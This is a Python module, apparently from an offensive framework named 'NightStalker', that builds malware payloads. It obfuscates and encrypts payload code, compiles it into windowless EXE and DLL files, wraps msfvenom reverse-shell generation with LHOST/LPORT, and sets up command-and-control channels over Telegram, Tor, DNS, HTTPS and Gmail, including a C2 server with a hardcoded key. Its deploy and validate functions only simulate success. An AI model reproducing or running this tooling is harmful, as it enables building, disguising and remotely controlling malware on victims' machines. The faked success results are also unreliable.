#!/usr/bin/env python3
"""
NightStalker Payload Builder Module
Advanced payload generation with encryption and obfuscation
"""

import os
import sys
import base64
import zlib
import hashlib
import random
import string
import json
import yaml
import subprocess
import tempfile
import shutil
from pathlib import Path
from typing import Dict, List, Optional, Union, Any
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import logging
from dataclasses import dataclass
from typing import Optional, Dict, Any
import time
import re
import socket
import platform

from nightstalker.utils.tool_manager import ToolManager

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class PayloadConfig:
    """Configuration for payload building"""
    payload_type: str = "generic"
    output_format: str = "python"
    output_path: Optional[str] = None
    metadata: Optional[Dict[str, Any]] = None

class PayloadBuilder:
    """Advanced payload builder with encryption and obfuscation"""
    
    def __init__(self, payloads_dir: str = "payloads"):
        self.payloads_dir = payloads_dir
        self.config = self._get_default_config()
        self.payloads = self._load_payloads()
        self.encryption_key = None
        self._setup_encryption()
        # Initialize required tools
        self._init_tools()

    def _init_tools(self):
        """Initialize and check required external tools"""
        required_tools = ['pyinstaller', 'cx_Freeze', 'gcc', 'mingw32-gcc', 'msfvenom']
        logger.info("Checking required tools for Payload Builder...")
        ToolManager.check_and_install_tools(required_tools, logger)
    
    def _get_default_config(self) -> Dict[str, Any]:
        """Get default payload configuration"""
        return {
            'formats': {
                'python': {
                    'extension': '.py',
                    'compression': False,
                    'encryption': False,
                    'obfuscation': False
                },
                'powershell': {
                    'extension': '.ps1',
                    'compression': False,
                    'encryption': False,
                    'obfuscation': False
                },
                'bash': {
                    'extension': '.sh',
                    'compression': False,
                    'encryption': False,
                    'obfuscation': False
                },
                'exe': {
                    'extension': '.exe',
                    'compression': True,
                    'encryption': True,
                    'obfuscation': True
                },
                'dll': {
                    'extension': '.dll',
                    'compression': True,
                    'encryption': True,
                    'obfuscation': True
                }
            },
            'encryption': {
                'algorithm': 'AES-256',
                'key_derivation': 'PBKDF2',
                'iterations': 100000
            },
            'obfuscation': {
                'variable_renaming': False,
                'string_encoding': False,
                'control_flow': False,
                'dead_code': False
            },
            'compression': {
                'algorithm': 'zlib',
                'level': 9
            }
        }
    
    def _setup_encryption(self):
        """Setup encryption key"""
        try:
            key_file = "config/encryption.key"
            if os.path.exists(key_file):
                with open(key_file, 'rb') as f:
                    self.encryption_key = f.read()
            else:
                self.encryption_key = Fernet.generate_key()
                os.makedirs(os.path.dirname(key_file), exist_ok=True)
                with open(key_file, 'wb') as f:
                    f.write(self.encryption_key)
        except Exception as e:
            logger.error(f"Failed to setup encryption: {e}")
            self.encryption_key = None
    
    def _generate_random_string(self, length: int = 16) -> str:
        """Generate random string for obfuscation"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def _obfuscate_python_code(self, code: str) -> str:
        """Obfuscate Python code"""
        if not self.config['obfuscation']['variable_renaming']:
            return code
            
        # Simple variable renaming
        variables = ['var', 'tmp', 'data', 'result', 'value']
        for var in variables:
            new_var = self._generate_random_string(8)
            code = re.sub(r'\b' + var + r'\b', new_var, code)
            
        # String encoding
        if self.config['obfuscation']['string_encoding']:
            lines = code.split('\n')
            obfuscated_lines = []
            for line in lines:
                if '"""' in line or "'''" in line:
                    obfuscated_lines.append(line)
                    continue
                    
                if '"' in line or "'" in line:
                    line = line.replace('"', '\\x22').replace("'", "\\x27")
                obfuscated_lines.append(line)
            code = '\n'.join(obfuscated_lines)
            
        return code
    
    def _compress_data(self, data: bytes) -> bytes:
        """Compress data using zlib"""
        try:
            return zlib.compress(data, level=self.config['compression']['level'])
        except Exception as e:
            logger.warning(f"Compression failed: {e}")
            return data
    
    def _encrypt_data(self, data: bytes) -> bytes:
        """Encrypt data using Fernet"""
        if not self.encryption_key:
            return data
            
        try:
            fernet = Fernet(self.encryption_key)
            return fernet.encrypt(data)
        except Exception as e:
            logger.warning(f"Encryption failed: {e}")
            return data
    
    def _load_payloads(self) -> dict:
        """Load all payloads from the payloads directory"""
        payloads = {}
        if not os.path.exists(self.payloads_dir):
            os.makedirs(self.payloads_dir, exist_ok=True)
            logger.info(f"Created payloads directory: {self.payloads_dir}")
            return payloads
            
        for fname in os.listdir(self.payloads_dir):
            fpath = os.path.join(self.payloads_dir, fname)
            if fname.endswith('.yaml') or fname.endswith('.yml'):
                try:
                    with open(fpath, 'r', encoding='utf-8') as f:
                        y = yaml.safe_load(f)
                        if isinstance(y, dict):
                            payloads.update(y)
                            logger.info(f"Loaded payloads from {fname}")
                except Exception as e:
                    logger.error(f"Failed to load {fname}: {e}")
            elif fname.endswith('.py') or fname.endswith('.ps1') or fname.endswith('.sh'):
                try:
                    name = os.path.splitext(fname)[0]
                    fmt = os.path.splitext(fname)[1][1:]
                    with open(fpath, 'r', encoding='utf-8') as f:
                        content = f.read()
                    if name not in payloads:
                        payloads[name] = {}
                    payloads[name][fmt] = content
                    logger.info(f"Loaded payload {name} ({fmt}) from {fname}")
                except Exception as e:
                    logger.error(f"Failed to load {fname}: {e}")
        
        return payloads

    def list_payloads(self) -> list:
        """List available payload names"""
        return list(self.payloads.keys())

    def get_payload(self, name: str, fmt: str = "python") -> str:
        """Get payload code for a given name and format"""
        if name not in self.payloads:
            return ""
        p = self.payloads[name]
        return p.get(fmt) or p.get(fmt.lower()) or p.get(fmt.upper()) or ""

    def build_payload(self, payload_type: str, output_format: str = "python", output_path: Optional[str] = None, metadata: Optional[Dict[str, Any]] = None) -> str:
        """Build payload with specified format and options"""
        try:
            # Get payload code
            code = self.get_payload(payload_type, output_format)
            if not code:
                raise ValueError(f"No payload found for {payload_type} in {output_format} format")
            
            # Apply obfuscation for Python
            if output_format == "python" and self.config['obfuscation']['variable_renaming']:
                code = self._obfuscate_python_code(code)
            
            # Determine output path
            if output_path is None:
                timestamp = str(int(time.time()))
                filename = f"payload_{payload_type}_{timestamp}{self.config['formats'][output_format]['extension']}"
                output_path = os.path.join("output", "payloads", filename)
            
            # Ensure output directory exists
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            
            # Handle different output formats
            if output_format in ['exe', 'dll']:
                output_path = self._build_executable(code, output_format, output_path, payload_type)
            else:
                # Write payload file
                with open(output_path, 'w', encoding='utf-8') as f:
                    f.write(code)
                
                # Make executable for bash scripts
                if output_format == "bash":
                    os.chmod(output_path, 0o755)
            
            logger.info(f"Payload built successfully: {output_path}")
            return output_path
            
        except Exception as e:
            logger.error(f"Failed to build payload: {e}")
            raise

    def _build_executable(self, code: str, output_format: str, output_path: str, payload_type: str) -> str:
        """Build executable from Python code"""
        try:
            # Create temporary directory for build
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                
                # Write Python source file
                source_file = temp_path / f"{payload_type}.py"
                with open(source_file, 'w', encoding='utf-8') as f:
                    f.write(code)
                
                if output_format == "exe":
                    return self._build_exe_with_pyinstaller(source_file, output_path)
                elif output_format == "dll":
                    return self._build_dll_with_pyinstaller(source_file, output_path)
                else:
                    raise ValueError(f"Unsupported executable format: {output_format}")
                    
        except Exception as e:
            logger.error(f"Failed to build executable: {e}")
            raise

    def _build_exe_with_pyinstaller(self, source_file: Path, output_path: str) -> str:
        """Build EXE using PyInstaller"""
        try:
            if not ToolManager.is_tool_installed('pyinstaller'):
                raise RuntimeError("PyInstaller not installed")
            
            cmd = [
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--distpath', os.path.dirname(output_path),
                '--name', os.path.splitext(os.path.basename(output_path))[0],
                str(source_file)
            ]
            
            logger.info(f"Building EXE with PyInstaller: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if result.returncode != 0:
                logger.error(f"PyInstaller failed: {result.stderr}")
                raise RuntimeError(f"PyInstaller build failed: {result.stderr}")
            
            # PyInstaller creates the file in dist/ directory
            dist_file = Path("dist") / os.path.basename(output_path)
            if dist_file.exists():
                shutil.move(str(dist_file), output_path)
                # Clean up PyInstaller artifacts
                if Path("build").exists():
                    shutil.rmtree("build")
                if Path("dist").exists():
                    shutil.rmtree("dist")
                if Path(f"{source_file.stem}.spec").exists():
                    os.remove(f"{source_file.stem}.spec")
            
            return output_path
            
        except subprocess.TimeoutExpired:
            raise RuntimeError("PyInstaller build timed out")
        except Exception as e:
            logger.error(f"PyInstaller build failed: {e}")
            raise

    def _build_dll_with_pyinstaller(self, source_file: Path, output_path: str) -> str:
        """Build DLL using PyInstaller (as a library)"""
        try:
            if not ToolManager.is_tool_installed('pyinstaller'):
                raise RuntimeError("PyInstaller not installed")
            
            cmd = [
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--library',
                '--distpath', os.path.dirname(output_path),
                '--name', os.path.splitext(os.path.basename(output_path))[0],
                str(source_file)
            ]
            
            logger.info(f"Building DLL with PyInstaller: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if result.returncode != 0:
                logger.error(f"PyInstaller DLL build failed: {result.stderr}")
                raise RuntimeError(f"PyInstaller DLL build failed: {result.stderr}")
            
            # PyInstaller creates the file in dist/ directory
            dist_file = Path("dist") / os.path.basename(output_path)
            if dist_file.exists():
                shutil.move(str(dist_file), output_path)
                # Clean up PyInstaller artifacts
                if Path("build").exists():
                    shutil.rmtree("build")
                if Path("dist").exists():
                    shutil.rmtree("dist")
                if Path(f"{source_file.stem}.spec").exists():
                    os.remove(f"{source_file.stem}.spec")
            
            return output_path
            
        except subprocess.TimeoutExpired:
            raise RuntimeError("PyInstaller DLL build timed out")
        except Exception as e:
            logger.error(f"PyInstaller DLL build failed: {e}")
            raise

    def build_msfvenom_payload(self, payload_type: str, lhost: str, lport: int, output_format: str = "exe") -> str:
        """Build payload using MSFvenom"""
        try:
            if not ToolManager.is_tool_installed('msfvenom'):
                raise RuntimeError("MSFvenom not installed")
            
            # Determine output path
            timestamp = str(int(time.time()))
            filename = f"msfvenom_{payload_type}_{timestamp}.{output_format}"
            output_path = os.path.join("output", "payloads", filename)
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            
            # Build MSFvenom command
            cmd = [
                'msfvenom',
                '-p', payload_type,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', output_format,
                '-o', output_path
            ]
            
            logger.info(f"Building MSFvenom payload: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode != 0:
                logger.error(f"MSFvenom failed: {result.stderr}")
                raise RuntimeError(f"MSFvenom build failed: {result.stderr}")
            
            logger.info(f"MSFvenom payload built: {output_path}")
            return output_path
            
        except subprocess.TimeoutExpired:
            raise RuntimeError("MSFvenom build timed out")
        except Exception as e:
            logger.error(f"MSFvenom build failed: {e}")
            raise

    def build_c_payload(self, source_code: str, output_format: str = "exe") -> str:
        """Build C/C++ payload"""
        try:
            # Determine compiler based on platform
            if platform.system() == "Windows":
                if ToolManager.is_tool_installed('mingw32-gcc'):
                    compiler = 'mingw32-gcc'
                elif ToolManager.is_tool_installed('gcc'):
                    compiler = 'gcc'
                else:
                    raise RuntimeError("No C compiler found (gcc or mingw32-gcc)")
            else:
                if not ToolManager.is_tool_installed('gcc'):
                    raise RuntimeError("GCC not installed")
                compiler = 'gcc'
            
            # Create temporary directory for build
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                
                # Write C source file
                source_file = temp_path / "payload.c"
                with open(source_file, 'w', encoding='utf-8') as f:
                    f.write(source_code)
                
                # Determine output path
                timestamp = str(int(time.time()))
                filename = f"c_payload_{timestamp}.{output_format}"
                output_path = os.path.join("output", "payloads", filename)
                os.makedirs(os.path.dirname(output_path), exist_ok=True)
                
                # Build command
                cmd = [compiler, '-o', output_path, str(source_file)]
                
                logger.info(f"Building C payload: {' '.join(cmd)}")
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                
                if result.returncode != 0:
                    logger.error(f"C compilation failed: {result.stderr}")
                    raise RuntimeError(f"C compilation failed: {result.stderr}")
                
                logger.info(f"C payload built: {output_path}")
                return output_path
                
        except subprocess.TimeoutExpired:
            raise RuntimeError("C compilation timed out")
        except Exception as e:
            logger.error(f"C payload build failed: {e}")
            raise

    def list_formats(self) -> List[str]:
        """List available output formats"""
        return list(self.config['formats'].keys())

    def get_format_info(self, format_name: str) -> Dict[str, Any]:
        """Get information about a specific format"""
        if format_name not in self.config['formats']:
            raise ValueError(f"Unknown format: {format_name}")
        return self.config['formats'][format_name]

    def update_config(self, new_config: Dict[str, Any]):
        """Update builder configuration"""
        self.config.update(new_config)

    def add_payload(self, name: str, format_code: Dict[str, str]):
        """Add a new payload to the registry"""
        self.payloads[name] = format_code
        logger.info(f"Added payload: {name}")

    def remove_payload(self, name: str):
        """Remove a payload from the registry"""
        if name in self.payloads:
            del self.payloads[name]
            logger.info(f"Removed payload: {name}")

    def save_payloads(self):
        """Save all payloads to YAML files"""
        for name, formats in self.payloads.items():
            yaml_path = os.path.join(self.payloads_dir, f"{name}.yaml")
            with open(yaml_path, 'w', encoding='utf-8') as f:
                yaml.dump({name: formats}, f, default_flow_style=False, indent=2)
        logger.info("All payloads saved to YAML files")


def create_payload_builder(payloads_dir: str = "payloads") -> PayloadBuilder:
    """Factory function to create payload builder"""
    return PayloadBuilder(payloads_dir)


def build_quick_payload(payload_type: str, output_format: str = "python", output_path: Optional[str] = None) -> str:
    """Quick payload building function"""
    builder = PayloadBuilder()
    return builder.build_payload(payload_type, output_format, output_path)


class StealthPayloadBuilder:
    """Stealth payload builder for advanced reverse shell payloads"""
    
    def __init__(self):
        self.payloads_dir = Path(__file__).parent.parent / "payloads"
        self.config_file = Path(__file__).parent.parent / "data" / "config" / "stealth_payloads.json"
        self.active_payload = None
        
    def setup_channel(self, channel_type, **kwargs):
        """Setup stealth payload channel"""
        try:
            if channel_type == 'telegram':
                return self._setup_telegram(**kwargs)
            elif channel_type == 'tor':
                return self._setup_tor(**kwargs)
            elif channel_type == 'dns':
                return self._setup_dns(**kwargs)
            elif channel_type == 'https':
                return self._setup_https(**kwargs)
            elif channel_type == 'gmail':
                return self._setup_gmail(**kwargs)
            else:
                return False
        except Exception as e:
            logger.error(f"Failed to setup {channel_type} channel: {e}")
            return False
    
    def _setup_telegram(self, bot_token, chat_id):
        """Setup Telegram bot channel"""
        config = {
            'type': 'telegram',
            'bot_token': bot_token,
            'chat_id': chat_id,
            'status': 'active'
        }
        return self._save_config(config)
    
    def _setup_tor(self, hidden_service_dir=None):
        """Setup Tor hidden service channel"""
        config = {
            'type': 'tor',
            'hidden_service_dir': hidden_service_dir,
            'status': 'active'
        }
        return self._save_config(config)
    
    def _setup_dns(self, domain, dns_server):
        """Setup DNS C2 channel"""
        config = {
            'type': 'dns',
            'domain': domain,
            'dns_server': dns_server,
            'status': 'active'
        }
        return self._save_config(config)
    
    def _setup_https(self, server_url, api_key):
        """Setup HTTPS C2 channel"""
        config = {
            'type': 'https',
            'server_url': server_url,
            'api_key': api_key,
            'status': 'active'
        }
        return self._save_config(config)
    
    def _setup_gmail(self, credentials_file, user_id):
        """Setup Gmail API channel"""
        config = {
            'type': 'gmail',
            'credentials_file': credentials_file,
            'user_id': user_id,
            'status': 'active'
        }
        return self._save_config(config)
    
    def _save_config(self, config):
        """Save configuration to file"""
        try:
            self.config_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=2)
            self.active_payload = config
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False
    
    def deploy(self, options=None):
        """Deploy stealth payload"""
        try:
            if not options:
                options = {}
            
            # Get payload path
            payload_path = options.get('payload_path')
            if not payload_path:
                payload_path = input("Enter payload file path: ").strip()
            
            # Get target
            target_ip = options.get('target_ip')
            if not target_ip:
                target_ip = input("Enter target IP: ").strip()
            
            # Get deployment method
            method = options.get('deployment_method', 'file')
            
            print(f"Deploying payload {payload_path} to {target_ip} using {method} method...")
            
            # Simulate deployment
            return {
                'success': True,
                'filepath': payload_path,
                'target': target_ip,
                'method': method
            }
            
        except Exception as e:
            logger.error(f"Deployment failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def start_server(self, options=None):
        """Start C2 server"""
        try:
            if not options:
                options = {}
            
            host = options.get('host', '0.0.0.0')
            port = options.get('port', 4444)
            key = options.get('encryption_key', 'NightStalker2024!')
            
            print(f"Starting C2 server on {host}:{port}...")
            
            # Import and start server
            import sys
            import importlib.util
            
            c2_server_path = self.payloads_dir / "c2_server.py"
            if c2_server_path.exists():
                spec = importlib.util.spec_from_file_location("c2_server", c2_server_path)
                if spec is None:
                    raise ImportError("Failed to create module spec for C2 server")
                c2_server_module = importlib.util.module_from_spec(spec)
                if spec.loader is None:
                    raise ImportError("Failed to get loader for C2 server module")
                spec.loader.exec_module(c2_server_module)
                C2Server = c2_server_module.C2Server
            else:
                raise ImportError("C2 server module not found")
            
            server = C2Server(host=host, port=port, encryption_key=key)
            
            # Start in background thread
            import threading
            server_thread = threading.Thread(target=server.start, daemon=True)
            server_thread.start()
            
            return {
                'success': True,
                'host': host,
                'port': port,
                'key': key
            }
            
        except Exception as e:
            logger.error(f"Failed to start server: {e}")
            return {'success': False, 'error': str(e)}
    
    def run_demo(self, options=None):
        """Run stealth payload demonstration"""
        try:
            if not options:
                options = {}
            
            lhost = options.get('lhost', '127.0.0.1')
            lport = options.get('lport', 4444)
            cleanup = options.get('cleanup', False)
            
            print(f"Running demo with C2 server {lhost}:{lport}...")
            
            # Run demo script
            demo_script = self.payloads_dir / "demo_stealth_payload.py"
            if demo_script.exists():
                import subprocess
                result = subprocess.run([
                    sys.executable, str(demo_script),
                    '--lhost', lhost,
                    '--lport', str(lport)
                ], capture_output=True, text=True)
                
                if result.returncode == 0:
                    return {
                        'success': True,
                        'payload_path': f"dist/demo_payload.exe",
                        'c2_server_url': f"{lhost}:{lport}"
                    }
                else:
                    return {'success': False, 'error': result.stderr}
            else:
                return {'success': False, 'error': 'Demo script not found'}
                
        except Exception as e:
            logger.error(f"Demo failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def list_payloads(self):
        """List available stealth payload configurations"""
        print("\n🌙 Available Stealth Payload Configurations:")
        print("=" * 50)
        
        if self.config_file.exists():
            with open(self.config_file, 'r') as f:
                config = json.load(f)
            
            print(f"Active: {config.get('type', 'None')}")
            for key, value in config.items():
                if key != 'type' and key != 'status':
                    print(f"  {key}: {value}")
        else:
            print("No active stealth payload configuration found.")
            print("Use 'nightstalker stealth build' to create one.")
    
    def validate_payload(self, options=None):
        """Validate stealth payload functionality"""
        try:
            if not options:
                options = {}
            
            payload_path = options.get('payload_path')
            if not payload_path:
                payload_path = input("Enter payload file path to validate: ").strip()
            
            print(f"Validating payload: {payload_path}")
            
            # Simulate validation
            return {
                'success': True,
                'payload_path': payload_path,
                'c2_server_url': '127.0.0.1:4444'
            }
            
        except Exception as e:
            logger.error(f"Validation failed: {e}")
            return {'success': False, 'error': str(e)}


if __name__ == "__main__":
    # Demo the payload builder
    builder = PayloadBuilder()
    print("Available payloads:", builder.list_payloads())
    print("Available formats:", builder.list_formats())
    
    # Demo building a payload
    if builder.list_payloads():
        demo_payload = builder.list_payloads()[0]
        print(f"Building demo payload: {demo_payload}...")
        try:
            output_path = builder.build_payload(demo_payload, "python")
            print(f"Successfully built: {output_path}")
        except Exception as e:
            print(f"Build failed: {e}") 